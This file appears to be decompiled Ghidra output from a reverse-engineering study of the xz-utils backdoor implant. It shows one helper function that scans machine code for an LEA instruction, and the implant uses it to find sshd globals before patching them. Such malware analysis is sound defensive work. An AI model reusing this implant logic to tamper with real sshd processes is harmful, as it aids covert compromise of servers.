// /home/kali/xzre-ghidra/xzregh/100F60_find_lea_instruction_with_mem_operand.c
// Function: find_lea_instruction_with_mem_operand @ 0x100F60
// Calling convention: unknown
// Prototype: undefined find_lea_instruction_with_mem_operand(void)


/*
 * AutoDoc: Restricts the LEA search to instructions that materialize a specific memory address, including displacement checks. It is invoked when the implant needs to confirm the exact offset of sshd globals before patching them.
 */
#include "xzre_types.h"


undefined8
find_lea_instruction_with_mem_operand(ulong param_1,ulong param_2,long *param_3,long param_4)

{
  int iVar1;
  long lVar2;
  long *plVar3;
  byte bVar4;
  long local_80 [12];
  
  bVar4 = 0;
  iVar1 = secret_data_append_from_call_site(0x1c8,0,0x1e,0);
  if (iVar1 != 0) {
    plVar3 = local_80;
    for (lVar2 = 0x16; lVar2 != 0; lVar2 = lVar2 + -1) {
      *(undefined4 *)plVar3 = 0;
      plVar3 = (long *)((long)plVar3 + ((ulong)bVar4 * -2 + 1) * 4);
    }
    if (param_3 == (long *)0x0) {
      param_3 = local_80;
    }
    for (; param_1 < param_2; param_1 = param_1 + 1) {
      iVar1 = x86_dasm(param_3,param_1,param_2);
      if ((((iVar1 != 0) && ((int)param_3[5] == 0x10d)) &&
          ((*(byte *)((long)param_3 + 0x1b) & 0x48) == 0x48)) &&
         (((*(uint *)((long)param_3 + 0x1c) & 0xff00ff00) == 0x5000000 &&
          ((param_4 == 0 || (param_3[1] + *param_3 + param_3[6] == param_4)))))) {
        return 1;
      }
    }
  }
  return 0;
}

